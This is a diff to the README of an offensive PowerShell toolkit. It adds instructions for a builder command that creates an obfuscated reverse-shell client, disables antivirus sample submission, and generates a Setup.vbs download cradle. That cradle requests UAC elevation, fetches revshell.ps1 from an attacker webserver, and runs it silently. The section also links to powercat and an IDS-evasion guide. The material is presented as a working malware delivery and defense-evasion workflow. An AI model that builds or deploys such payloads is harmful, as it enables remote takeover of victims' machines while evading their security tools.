@@ -149,6 +149,16 @@ Encode\Decode tcp data flow between client and server.
 
 <br />
 
+Creates a new obfuscated client (revshell.ps1), disable av samples submition and<br />creates Setup.vbs download crandle that spawn UAC gui to run crandle\client with elevated privs.
+```powershell
+.\Builder.ps1 -action "obfuscate" -force "true" -VbsName "Setup" -Elevate "true"
+```
+
+![up](https://user-images.githubusercontent.com/23490060/156248091-1b64c1bc-cb9d-4fa0-b1fa-9a01235ebae6.png)
+<b><i>Remark: crandle.vbs downloads revshell.ps1 from attacker webserver (http.server) to %tmp% and executes revshell.ps1 in background.</i></b>
+
+<br />
+
 #### URLs
 https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1<br />
 https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells
